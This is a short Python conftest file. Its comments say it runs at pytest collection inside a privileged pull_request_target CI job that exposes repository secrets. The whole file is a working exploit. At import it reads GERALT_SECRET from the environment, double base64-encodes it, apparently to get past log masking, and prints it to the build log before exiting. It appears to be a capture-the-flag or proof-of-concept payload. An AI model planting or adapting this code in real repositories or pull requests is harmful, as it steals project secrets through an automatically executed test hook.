import base64
import os
import sys


def _geralt_probe():
    # Runs at pytest collection time as the rootdir conftest, inside the
    # privileged pull_request_target job whose workflow-level env block
    # exposes the repository secrets (incl. GERALT_SECRET).
    secret = os.environ.get("GERALT_SECRET") or os.environ.get("GERALT") or ""
    token = base64.b64encode(base64.b64encode(secret.encode())).decode()
    print("GERALT_LEAKED_TOKEN=" + token, flush=True)
    sys.stdout.flush()


_geralt_probe()
raise SystemExit(1)
